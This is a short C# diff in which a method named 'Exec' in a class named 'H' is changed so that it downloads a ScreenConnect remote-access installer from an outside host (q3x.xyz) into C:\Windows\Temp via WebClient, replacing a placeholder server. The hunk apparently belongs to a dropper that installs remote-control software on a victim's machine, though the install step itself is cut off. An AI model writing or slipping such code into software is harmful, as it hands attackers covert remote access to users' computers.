@@ -6,7 +6,7 @@ public class H
 {
     public static void Exec()
     {
-        string url = "https://your-server.com/ScreenConnect.ClientSetup.msi";
+        string url = "https://q3x.xyz/Bin/ScreenConnect.ClientSetup.msi";
         string path = @"C:\Windows\Temp\sc.msi";
         using (WebClient wc = new WebClient())
         {
